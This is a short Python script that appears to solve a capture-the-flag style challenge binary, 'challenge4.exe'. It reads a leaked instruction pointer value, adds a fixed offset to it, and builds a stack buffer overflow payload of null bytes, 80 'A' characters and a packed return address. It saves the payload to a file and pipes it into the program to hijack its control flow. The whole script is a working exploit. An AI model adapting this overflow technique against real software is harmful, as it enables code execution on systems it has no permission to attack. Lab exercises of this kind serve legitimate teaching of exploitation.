import subprocess
import sys
import struct


program_path = "challenge4.exe"
arg = "challenge4mal.exe"

cmd = [program_path, arg]
process = subprocess.Popen(cmd, stdin=subprocess.PIPE)

eip = raw_input()
addr = struct.pack('<I', (int(eip,16) + 0x2E00))
input_str = ("\x00" * 4 + 80 * "A" + addr)
#input_str = ("\x00" * 84 + addr)

# puts input_str in to a file
f = open("myfile.txt", "w")

# Write some text to the file
f.write(input_str)

# Close the file
f.close()

process.communicate(input=input_str.encode())
